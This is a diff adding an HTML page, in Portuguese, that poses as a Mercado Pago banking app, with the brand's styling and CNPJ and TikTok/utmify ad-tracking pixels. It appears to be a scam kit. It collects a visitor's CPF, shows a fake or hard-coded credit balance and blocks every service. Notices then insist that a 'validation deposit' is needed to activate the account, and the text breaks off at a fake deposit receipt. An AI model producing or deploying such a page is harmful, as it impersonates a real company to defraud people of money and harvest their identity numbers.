@@ -1,0 +1,1540 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D4BQAE3C77UD6NKP6AK0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/vite.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meu Banco Digital</title>
+
+    <!-- Bootstrap 5.3.0 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+    <!-- Font Awesome 6.4.0 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+      :root {
+        --mp-blue: #009EE3;
+        --mp-light-blue: #00B1EA;
+        --black: #1A1A1A;
+        --gray-dark: #333;
+        --gray-light: #f5f5f5;
+        --white: #FFFFFF;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        background-color: var(--gray-light);
+        overflow-x: hidden;
+      }
+
+      .app-container {
+        max-width: 480px;
+        margin: 0 auto;
+        background-color: var(--white);
+        min-height: 100vh;
+        position: relative;
+        padding-bottom: 80px;
+      }
+
+      .header {
+        background-color: var(--mp-blue);
+        color: var(--white);
+        padding: 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .header-left {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .logo {
+        height: 40px;
+        width: auto;
+        -o-object-fit: contain;
+           object-fit: contain;
+      }
+
+      .header-icons {
+        display: flex;
+        gap: 20px;
+      }
+
+      .header-icons button {
+        background: none;
+        border: none;
+        color: var(--white);
+        font-size: 20px;
+        cursor: pointer;
+        padding: 5px;
+        transition: transform 0.2s;
+      }
+
+      .header-icons button.gray-icon {
+        color: var(--white);
+      }
+
+      .header-icons button:hover {
+        transform: scale(1.1);
+      }
+
+      .balance-card {
+        background: linear-gradient(135deg, var(--mp-blue), var(--mp-light-blue));
+        margin: 20px;
+        padding: 25px;
+        border-radius: 20px;
+        box-shadow: 0 8px 24px rgba(0, 158, 227, 0.3);
+      }
+
+      .balance-label {
+        color: var(--white);
+        font-size: 14px;
+        margin-bottom: 5px;
+        opacity: 0.9;
+      }
+
+      .balance-amount {
+        color: var(--white);
+        font-size: 36px;
+        font-weight: bold;
+        margin-bottom: 20px;
+      }
+
+      .deposit-button-card {
+        background: var(--white);
+        border: 2px solid var(--white);
+        color: var(--mp-blue);
+        padding: 12px 24px;
+        border-radius: 30px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        width: 100%;
+        font-size: 16px;
+      }
+
+      .deposit-button-card:hover {
+        background-color: rgba(255, 255, 255, 0.9);
+        color: var(--mp-blue);
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      }
+
+      .actions-section {
+        padding: 20px;
+        display: flex;
+        justify-content: space-around;
+        gap: 15px;
+        flex-wrap: wrap;
+      }
+
+      .action-button {
+        background: none;
+        border: none;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        cursor: pointer;
+        transition: transform 0.2s;
+        flex: 1;
+        min-width: 70px;
+      }
+
+      .action-button:hover {
+        transform: translateY(-4px);
+      }
+
+      .action-icon {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        background-color: var(--white);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+        color: var(--mp-blue);
+        transition: all 0.3s;
+        border: 2px solid #E8E8E8;
+      }
+
+      .action-button:hover .action-icon {
+        background-color: var(--mp-blue);
+        color: var(--white);
+        box-shadow: 0 4px 12px rgba(0, 158, 227, 0.3);
+        border-color: var(--mp-blue);
+      }
+
+      .action-icon.deposit-icon {
+        background-color: var(--mp-blue);
+        color: var(--white);
+        font-size: 28px;
+      }
+
+      .action-icon.deposit-icon.pulse {
+        animation: pulse 0.6s;
+      }
+
+      @keyframes pulse {
+        0%, 100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.15);
+        }
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .action-label {
+        color: var(--gray-dark);
+        font-size: 13px;
+        font-weight: 500;
+      }
+
+      .services-section {
+        padding: 20px;
+      }
+
+      .section-title {
+        color: var(--black);
+        font-size: 20px;
+        font-weight: bold;
+        margin-bottom: 15px;
+      }
+
+      .services-list {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .service-button {
+        background: none;
+        border: none;
+        padding: 18px 20px;
+        background-color: var(--gray-light);
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        cursor: pointer;
+        transition: all 0.3s;
+        width: 100%;
+      }
+
+      .service-button:hover {
+        background-color: #e8e8e8;
+        transform: translateX(5px);
+      }
+
+      .service-left {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+
+      .service-icon {
+        font-size: 26px;
+        color: var(--mp-blue);
+        font-weight: 600;
+      }
+
+      .service-name {
+        color: var(--black);
+        font-size: 16px;
+        font-weight: 500;
+      }
+
+      .service-arrow {
+        color: var(--gray-dark);
+        font-size: 18px;
+      }
+
+      .bottom-nav {
+        position: fixed;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        max-width: 480px;
+        width: 100%;
+        background-color: var(--white);
+        border-top: 1px solid #e0e0e0;
+        display: flex;
+        justify-content: space-around;
+        padding: 12px 0;
+        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
+      }
+
+      .nav-button {
+        background: none;
+        border: none;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 4px;
+        cursor: pointer;
+        color: var(--gray-dark);
+        transition: all 0.2s;
+        padding: 8px 20px;
+      }
+
+      .nav-button:hover {
+        color: var(--mp-blue);
+        transform: translateY(-2px);
+      }
+
+      .nav-button i {
+        font-size: 24px;
+      }
+
+      .nav-label {
+        font-size: 11px;
+      }
+
+      .notification {
+        position: fixed;
+        top: 50px;
+        left: 50%;
+        transform: translateX(-50%);
+        max-width: 360px;
+        width: 90%;
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border-radius: 16px;
+        padding: 16px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+        z-index: 1200;
+        animation: slideDown 0.4s ease-out;
+        border: 1px solid rgba(255, 255, 255, 0.3);
+        display: none;
+      }
+
+      .notification.show {
+        display: block;
+      }
+
+      @keyframes slideDown {
+        from {
+          opacity: 0;
+          transform: translateX(-50%) translateY(-20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(-50%) translateY(0);
+        }
+      }
+
+      .notification-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        margin-bottom: 8px;
+      }
+
+      .notification-icon {
+        width: 32px;
+        height: 32px;
+        border-radius: 8px;
+        background-color: #9E9E9E;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+        color: var(--white);
+      }
+
+      .notification-close {
+        background: none;
+        border: none;
+        color: var(--gray-dark);
+        font-size: 20px;
+        cursor: pointer;
+        padding: 0;
+        width: 24px;
+        height: 24px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+        transition: all 0.2s;
+      }
+
+      .notification-close:hover {
+        background-color: rgba(0, 0, 0, 0.05);
+      }
+
+      .notification-title {
+        font-size: 15px;
+        font-weight: 600;
+        color: var(--black);
+        margin-bottom: 4px;
+      }
+
+      .notification-message {
+        font-size: 14px;
+        color: var(--gray-dark);
+        line-height: 1.4;
+      }
+
+      .modal-backdrop {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.85);
+        z-index: 1100;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        -webkit-backdrop-filter: blur(8px);
+                backdrop-filter: blur(8px);
+      }
+
+      .modal-backdrop.show {
+        display: flex;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      .modal-content {
+        background: #FFFFFF !important;
+        border-radius: 20px;
+        max-width: 440px;
+        width: 90%;
+        max-height: 90vh;
+        overflow-y: auto;
+        cursor: default;
+        position: relative;
+        z-index: 1101;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        opacity: 1 !important;
+        isolation: isolate;
+        display: flex;
+        flex-direction: column;
+      }
+
+      @keyframes scaleIn {
+        from {
+          transform: scale(0.9);
+        }
+        to {
+          transform: scale(1);
+        }
+      }
+
+      .modal-header {
+        padding: 20px;
+        border-bottom: 1px solid #e0e0e0;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: #FFFFFF !important;
+        border-radius: 20px 20px 0 0;
+        opacity: 1 !important;
+        position: relative;
+        z-index: 1;
+      }
+
+      .modal-title {
+        font-size: 20px;
+        font-weight: bold;
+        color: var(--black);
+      }
+
+      .modal-close {
+        background: none;
+        border: none;
+        font-size: 24px;
+        color: var(--gray-dark);
+        cursor: pointer;
+        width: 32px;
+        height: 32px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+        transition: all 0.2s;
+      }
+
+      .modal-close:hover {
+        background-color: var(--gray-light);
+      }
+
+      .modal-body {
+        padding: 35px 28px 32px;
+        background: #FFFFFF !important;
+        border-radius: 0 0 20px 20px;
+        opacity: 1 !important;
+        position: relative;
+        z-index: 1;
+        display: flex;
+        flex-direction: column;
+        gap: 0;
+      }
+
+      .deposit-info {
+        text-align: center;
+        margin-bottom: 28px;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .pix-icon-container {
+        width: 80px;
+        height: 80px;
+        margin: 0 0 18px 0;
+        background: linear-gradient(135deg, var(--mp-blue), var(--mp-light-blue));
+        border-radius: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 8px 24px rgba(0, 158, 227, 0.3);
+        flex-shrink: 0;
+      }
+
+      .pix-icon-large {
+        font-size: 40px;
+        color: var(--white);
+      }
+
+      .deposit-amount {
+        font-size: 52px;
+        font-weight: 800;
+        color: var(--black);
+        margin: 0 0 16px 0;
+        line-height: 1;
+        letter-spacing: -1.5px;
+        flex-shrink: 0;
+      }
+
+      .deposit-description {
+        font-size: 14px;
+        color: var(--gray-dark);
+        line-height: 1.6;
+        margin: 0 0 22px 0;
+        padding: 0 8px;
+        max-width: 100%;
+      }
+
+      .deposit-description strong {
+        color: var(--black);
+        font-size: 15px;
+        font-weight: 600;
+        display: block;
+        margin-bottom: 4px;
+      }
+
+      .security-badges {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 0;
+        flex-wrap: wrap;
+        width: 100%;
+      }
+
+      .security-badge {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 6px;
+        padding: 12px 10px;
+        background-color: var(--gray-light);
+        border-radius: 12px;
+        flex: 1;
+        min-width: 85px;
+        max-width: 110px;
+      }
+
+      .security-badge i {
+        font-size: 24px;
+        color: #4CAF50;
+      }
+
+      .security-badge span {
+        font-size: 11px;
+        color: var(--gray-dark);
+        font-weight: 500;
+        text-align: center;
+      }
+
+      .payment-button {
+        background: linear-gradient(135deg, var(--mp-blue), var(--mp-light-blue));
+        border: none;
+        color: var(--white);
+        padding: 18px 32px;
+        border-radius: 30px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s;
+        width: 100%;
+        font-size: 17px;
+        box-shadow: 0 8px 28px rgba(0, 158, 227, 0.4);
+        margin: 0;
+        text-transform: none;
+        letter-spacing: 0.3px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      }
+
+      .payment-button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 12px 32px rgba(0, 158, 227, 0.5);
+        background: linear-gradient(135deg, var(--mp-light-blue), var(--mp-blue));
+      }
+
+      .payment-button:active {
+        transform: translateY(0);
+      }
+
+      .payment-button i {
+        margin-right: 10px;
+        font-size: 20px;
+      }
+
+      /* Validation Notice */
+      .validation-notice {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        padding: 14px 18px;
+        background-color: #f8f8f8;
+        border-radius: 12px;
+        margin: 20px 20px 0 20px;
+        font-size: 13px;
+        color: #777;
+        line-height: 1.6;
+      }
+
+      .validation-notice i {
+        font-size: 15px;
+        color: #aaa;
+        margin-top: 1px;
+        flex-shrink: 0;
+      }
+
+      .validation-notice span {
+        flex: 1;
+      }
+
+      /* Receipt Container */
+      .receipt-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: var(--gray-bg);
+        z-index: 2000;
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.5s ease, visibility 0.5s ease;
+        overflow-y: auto;
+        padding: 16px;
+        display: flex;
+        align-items: flex-start;
+        justify-content: center;
+      }
+
+      .receipt-container.show {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .receipt-content {
+        background: #FFFFFF;
+        border-radius: 20px;
+        max-width: 500px;
+        width: 100%;
+        margin: auto;
+        padding: 24px 20px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+        animation: slideUp 0.5s ease;
+        max-height: calc(100vh - 32px);
+        overflow-y: auto;
+      }
+
+      @keyframes slideUp {
+        from {
+          transform: translateY(30px);
+          opacity: 0;
+        }
+        to {
+          transform: translateY(0);
+          opacity: 1;
+        }
+      }
+
+      .receipt-header {
+        text-align: center;
+        margin-bottom: 28px;
+      }
+
+      .receipt-icon {
+        width: 70px;
+        height: 70px;
+        margin: 0 auto 16px;
+        background: linear-gradient(135deg, #4CAF50, #66BB6A);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
+      }
+
+      .receipt-icon i {
+        font-size: 42px;
+        color: #FFFFFF;
+        font-weight: 900;
+      }
+
+      .receipt-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: var(--black);
+        margin: 0 0 8px 0;
+      }
+
+      .receipt-subtitle {
+        font-size: 14px;
+        color: var(--gray-dark);
+        margin: 0;
+      }
+
+      .receipt-body {
+        margin-bottom: 24px;
+      }
+
+      .receipt-section {
+        padding: 14px 0;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+      }
+
+      .receipt-label {
+        font-size: 14px;
+        color: var(--gray-dark);
+        font-weight: 500;
+      }
+
+      .receipt-value {
+        font-size: 15px;
+        color: var(--black);
+        font-weight: 600;
+        text-align: right;
+      }
+
+      .receipt-amount-value {
+        font-size: 28px;
+        color: #4CAF50;
+        font-weight: 700;
+      }
+
+      .receipt-code {
+        font-family: monospace;
+        font-size: 16px;
+        background: var(--gray-light);
+        padding: 6px 12px;
+        border-radius: 8px;
+      }
+
+      .receipt-divider {
+        height: 1px;
+        background: #E0E0E0;
+        margin: 8px 0;
+      }
+
+      .receipt-info {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        padding: 14px 16px;
+        background: #F0F7FF;
+        border-radius: 12px;
+        margin-top: 20px;
+      }
+
+      .receipt-info i {
+        font-size: 16px;
+        color: #2196F3;
+        margin-top: 2px;
+        flex-shrink: 0;
+      }
+
+      .receipt-info span {
+        font-size: 13px;
+        color: #1976D2;
+        line-height: 1.5;
+      }
+
+      .payment-confirm-button {
+        background: linear-gradient(135deg, var(--mp-blue), var(--mp-light-blue));
+        border: none;
+        color: var(--white);
+        padding: 18px 32px;
+        border-radius: 30px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s;
+        width: 100%;
+        font-size: 17px;
+        box-shadow: 0 8px 28px rgba(0, 158, 227, 0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .payment-confirm-button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 32px rgba(0, 158, 227, 0.5);
+      }
+
+      .payment-confirm-button i {
+        font-size: 20px;
+      }
+
+      /* Fade Out Animation */
+      .app-container.fade-out {
+        animation: fadeOut 0.5s ease forwards;
+      }
+
+      @keyframes fadeOut {
+        from {
+          opacity: 1;
+        }
+        to {
+          opacity: 0;
+        }
+      }
+    </style>
+  <script async="" src="js/badge.js"></script></head>
+  <body>
+    <div id="root">
+      <!-- STEP 1: LOGIN -->
+      <div id="step-login" class="step-container">
+        <style>
+          .login-header {
+            background-color: #009EE3;
+            padding: 20px;
+            text-align: center;
+          }
+          .login-container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+          }
+          .login-card {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+          }
+          .info-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+          }
+          .info-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+          }
+          .info-card-body {
+            padding: 20px;
+          }
+          .info-card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+          }
+          .info-card-text {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 15px;
+          }
+          .info-card-link {
+            color: #009EE3;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+          }
+        </style>
+
+        <div class="login-header">
+          <img src="/logo.png" alt="Logo" style="width: 180px;">
+        </div>
+
+        <div class="login-container">
+          <div class="login-card">
+            <h2 style="text-align: center; margin-bottom: 25px; color: #333; font-size: 22px;">Acesse sua conta</h2>
+            <div style="margin-bottom: 20px;">
+              <label style="display: block; margin-bottom: 8px; color: #666; font-size: 14px; font-weight: 500;">CPF</label>
+              <input type="text" id="cpf-input" placeholder="Digite seu CPF" style="width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; box-sizing: border-box;">
+            </div>
+            <button onclick="handleLogin()" style="width: 100%; background: linear-gradient(135deg, #009EE3, #00B1EA); color: white; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px;">
+              Acessar
+            </button>
+          </div>
+
+          <div class="info-card">
+            <img src="https://images.pexels.com/photos/6801648/pexels-photo-6801648.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Resultado financeiro">
+            <div class="info-card-body">
+              <h5 class="info-card-title">Resultado financeiro anual</h5>
+              <p class="info-card-text">Mercado Pago registra lucro líquido de 2,3 bilhões em 2024</p>
+              <a href="#" class="info-card-link">
+                Saiba Mais <i class="bi bi-arrow-right"></i>
+              </a>
+            </div>
+          </div>
+
+          <div class="info-card">
+            <img src="https://images.pexels.com/photos/4968630/pexels-photo-4968630.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Pagamentos Seguros">
+            <div class="info-card-body">
+              <h5 class="info-card-title">Pagamentos Seguros</h5>
+              <p class="info-card-text">Tecnologia de ponta para proteger todas as suas transações financeiras</p>
+              <a href="#" class="info-card-link">
+                Saiba Mais <i class="bi bi-arrow-right"></i>
+              </a>
+            </div>
+          </div>
+
+          <div class="info-card">
+            <img src="https://images.pexels.com/photos/4968391/pexels-photo-4968391.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Facilidade de uso">
+            <div class="info-card-body">
+              <h5 class="info-card-title">Facilidade de uso</h5>
+              <p class="info-card-text">Interface intuitiva e moderna para gerenciar suas finanças com simplicidade</p>
+              <a href="#" class="info-card-link">
+                Saiba Mais <i class="bi bi-arrow-right"></i>
+              </a>
+            </div>
+          </div>
+
+          <div style="text-align: center; padding: 20px 0; color: #666; font-size: 13px;">
+            <p style="margin: 5px 0;">2025 MERCADO PAGO. Todos os direitos reservados.</p>
+            <p style="margin: 5px 0;">CNPJ: 36.272.465/0001-49</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- LOADING SCREEN -->
+      <div id="step-loading" class="step-container" style="display: none;">
+        <div style="background-color: #009EE3; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+          <img src="/logo.png" alt="Logo" style="width: 200px; margin-bottom: 40px; animation: pulse 2s infinite;">
+          <div style="width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+          <p id="loading-message" style="color: white; margin-top: 30px; font-size: 16px; font-weight: 500;">Verificando suas credenciais...</p>
+        </div>
+      </div>
+
+      <!-- STEP 2: BANCO -->
+      <div id="step-banco" class="step-container" style="display: none;">
+      <div class="app-container">
+        <header class="header">
+          <div class="header-left">
+            <img src="/logo.png" alt="Mercado Pago" class="logo">
+          </div>
+          <div class="header-icons">
+            <button class="gray-icon" onclick="handleBlockedAction('Visibility')" aria-label="Visibilidade">
+              <i class="bi bi-eye-fill" style="font-size: 22px;"></i>
+            </button>
+            <button class="gray-icon" onclick="handleBlockedAction('Notifications')" aria-label="Notificações">
+              <i class="bi bi-bell-fill" style="font-size: 22px;"></i>
+            </button>
+            <button onclick="handleBlockedAction('Support')" aria-label="Suporte">
+              <i class="bi bi-headset" style="font-size: 22px;"></i>
+            </button>
+            <button onclick="handleBlockedAction('Settings')" aria-label="Configurações">
+              <i class="bi bi-gear-fill" style="font-size: 22px;"></i>
+            </button>
+          </div>
+        </header>
+
+<div class="balance-card">
+  <div class="balance-label">Saldo disponível</div>
+  <div class="balance-amount">
+    <!-- O valor será inserido aqui -->
+    <script>
+      // Recuperar o valor aprovado do localStorage
+      const creditoAprovado = localStorage.getItem("creditoAprovado");
+
+      // Verificar se o valor aprovado existe no localStorage
+      if (creditoAprovado) {
+        // Exibir o valor na div com a classe "balance-amount"
+        document.querySelector(".balance-amount").textContent = "R$ " + creditoAprovado.replace(".", ",");
+      } else {
+        // Se não houver valor aprovado no localStorage, exibe "R$ 0,00"
+        document.querySelector(".balance-amount").textContent = "R$ 4,600,00";
+      }
+    </script>
+  </div>
+  <button class="deposit-button-card" onclick="handleDepositAction()">
+    Realizar Depósito
+  </button>
+</div>
+
+
+        <section class="actions-section">
+          <button class="action-button" onclick="handleBlockedAction('Pix')">
+            <div class="action-icon">
+              <svg viewBox="0 0 512 512" width="32" height="32" fill="currentColor">
+                <path d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.5H112.6C132.6 391.5 151.5 383.7 165.7 369.5L242.4 292.5zM262.5 218.9C257.1 224.3 247.8 224.3 242.4 218.9L165.7 142.1C151.5 127.9 132.6 120.1 112.6 120.1H103.3L200.7 22.76C231.1-7.586 280.3-7.586 310.6 22.76L407.7 120.1H392.6C372.6 120.1 353.7 127.9 339.5 142.1L262.5 218.9zM112.6 142.1C126.4 142.1 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.1 392.6 142.1H430.3L488.6 200.8C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 362.9 355.5 353.1L278.5 276.4C271.3 269.1 261.9 265.6 252.5 265.6C243 265.6 233.6 269.1 226.4 276.4L149.7 353.1C139.1 362.9 126.4 368.9 112.6 368.9H80.78L22.76 310.6C-7.586 280.3-7.586 231.1 22.76 200.8L80.78 142.1H112.6z"/>
+              </svg>
+            </div>
+            <span class="action-label">Pix</span>
+          </button>
+
+          <button class="action-button" onclick="handleBlockedAction('Boleto')">
+            <div class="action-icon">
+              <i class="bi bi-upc-scan" style="font-size: 32px;"></i>
+            </div>
+            <span class="action-label">Boleto</span>
+          </button>
+
+          <button class="action-button" id="depositButtonIcon" onclick="handleDepositAction()">
+            <div class="action-icon deposit-icon">
+              <i class="bi bi-cash-stack" style="font-size: 30px;"></i>
+            </div>
+            <span class="action-label">Depositar</span>
+          </button>
+
+          <button class="action-button" onclick="handleBlockedAction('Cofrinhos')">
+            <div class="action-icon">
+              <i class="bi bi-piggy-bank-fill" style="font-size: 28px;"></i>
+            </div>
+            <span class="action-label">Cofrinhos</span>
+          </button>
+        </section>
+
+        <div class="validation-notice">
+          <i class="bi bi-exclamation-circle-fill" style="font-size: 18px; color: #9E9E9E;"></i>
+          <span>Você precisa realizar um depósito para validar seus dados. O pagamento confirmará se as informações da conta estão corretas.</span>
+        </div>
+
+        <section class="services-section">
+          <h2 class="section-title">Serviços</h2>
+          <div class="services-list">
+            <button class="service-button" onclick="handleBlockedAction('Investimentos')">
+              <div class="service-left">
+                <i class="service-icon bi bi-graph-up-arrow" style="color: var(--mp-blue);"></i>
+                <span class="service-name">Investimentos</span>
+              </div>
+              <i class="service-arrow bi bi-chevron-right"></i>
+            </button>
+
+            <button class="service-button" onclick="handleBlockedAction('Cartões')">
+              <div class="service-left">
+                <i class="service-icon bi bi-credit-card" style="color: var(--mp-blue);"></i>
+                <span class="service-name">Cartões</span>
+              </div>
+              <i class="service-arrow bi bi-chevron-right"></i>
+            </button>
+
+            <button class="service-button" onclick="handleBlockedAction('Empréstimos')">
+              <div class="service-left">
+                <i class="service-icon bi bi-cash-coin" style="color: var(--mp-blue);"></i>
+                <span class="service-name">Empréstimos</span>
+              </div>
+              <i class="service-arrow bi bi-chevron-right"></i>
+            </button>
+
+            <button class="service-button" onclick="handleBlockedAction('Seguros')">
+              <div class="service-left">
+                <i class="service-icon bi bi-shield-check" style="color: var(--mp-blue);"></i>
+                <span class="service-name">Seguros</span>
+              </div>
+              <i class="service-arrow bi bi-chevron-right"></i>
+            </button>
+
+            <button class="service-button" onclick="handleBlockedAction('Recarga de Celular')">
+              <div class="service-left">
+                <i class="service-icon bi bi-phone" style="color: var(--mp-blue);"></i>
+                <span class="service-name">Recarga de Celular</span>
+              </div>
+              <i class="service-arrow bi bi-chevron-right"></i>
+            </button>
+          </div>
+        </section>
+
+        <nav class="bottom-nav">
+          <button class="nav-button" onclick="handleNavigation('Início')">
+            <i class="bi bi-house-door-fill" style="color: var(--mp-blue);"></i>
+            <span class="nav-label">Início</span>
+          </button>
+          <button class="nav-button" onclick="handleNavigation('Extrato')">
+            <i class="bi bi-list-ul" style="color: var(--mp-blue);"></i>
+            <span class="nav-label">Extrato</span>
+          </button>
+          <button class="nav-button" onclick="handleNavigation('Perfil')">
+            <i class="bi bi-person-circle" style="color: var(--mp-blue);"></i>
+            <span class="nav-label">Perfil</span>
+          </button>
+        </nav>
+
+        <div class="notification" id="notification">
+          <div class="notification-header">
+            <div class="notification-icon">
+              <i class="bi bi-exclamation-triangle-fill" style="font-size: 20px;"></i>
+            </div>
+            <button class="notification-close" onclick="handleCloseNotification()" aria-label="Fechar">
+              <i class="bi bi-x"></i>
+            </button>
+          </div>
+          <div class="notification-title">Ative sua conta!</div>
+          <div class="notification-message">
+            Para utilizar todos os recursos, você precisa ativar sua conta realizando um depósito inicial.
+          </div>
+        </div>
+
+      </div>
+    </div>
+    </div>
+    <!-- END STEP 2: BANCO -->
+
+    <!-- STEP 3: COMPROVANTE -->
+    <div id="step-comprovante" class="step-container" style="display: none;">
+    <div class="receipt-container show" id="receiptContainer">
+      <div class="receipt-content">
+        <div class="receipt-header">
+          <div class="receipt-icon">
+            <i class="bi bi-check-lg" style="font-size: 42px; font-weight: 900;"></i>
+          </div>
+          <h2 class="receipt-title">Comprovante de Depósito</h2>
+          <p class="receipt-subtitle">Depósito de Validação</p>
